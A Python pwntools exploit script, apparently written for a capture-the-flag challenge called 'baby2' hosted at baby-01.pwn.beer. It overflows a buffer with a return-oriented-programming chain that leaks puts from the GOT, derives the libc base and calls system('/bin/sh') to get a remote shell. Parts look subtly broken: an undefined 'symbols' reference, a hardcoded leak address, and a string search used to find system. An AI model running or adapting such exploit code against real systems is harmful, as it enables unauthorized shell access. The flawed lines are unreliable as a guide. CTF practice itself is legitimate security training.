from pwn import *
from binascii import hexlify


# r = process("./baby2")
r = remote('baby-01.pwn.beer', 10002)

binary = ELF('baby2')
libc = ELF('libc.so.6')

r.recvuntil('input: ')

pop_rdi = p64(0x0000000000400783)
printf = p64(0x00000000004006FA)
puts_got = p64(0x0000000000601FC8)
program_main = p64(0x0000000000400698)

banner = p64(0x00000000004006EB)

payload = 'a'*24
payload += pop_rdi + puts_got + printf + p64(symbols['main'])

# r.sendline(payload)

# puts = u64(r.recv(6).ljust(8, '\x00'))
# print(puts)
puts = 0x7ffff7e3ca40

# # 422: 00000000000809c0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
# puts_libc = 0x00000000000809c0
# print(puts_libc)
puts_libc = libc.symbols['puts']

libc_base = puts - libc.symbols['puts']
print(libc_base)
print(hex(libc_base))


# libc_base = p64(0x7ffff7dbc080)
# libc_base = 0x7ffff7dbc080

libc.address = libc_base

# 1b3e9a /bin/sh
# sh_addr = p64(0x1b3e9a + libc_base)
bin_sh = next(libc.search("/bin/sh\x00"))
system = next(libc.search('system'))

# system = 0x84062 + libc_base
# bin_sh = 0x1b3e9a + libc_base

payload = 'a'*24 + pop_rdi + p64(bin_sh) + p64(system)
r.sendline(payload)
r.interactive()
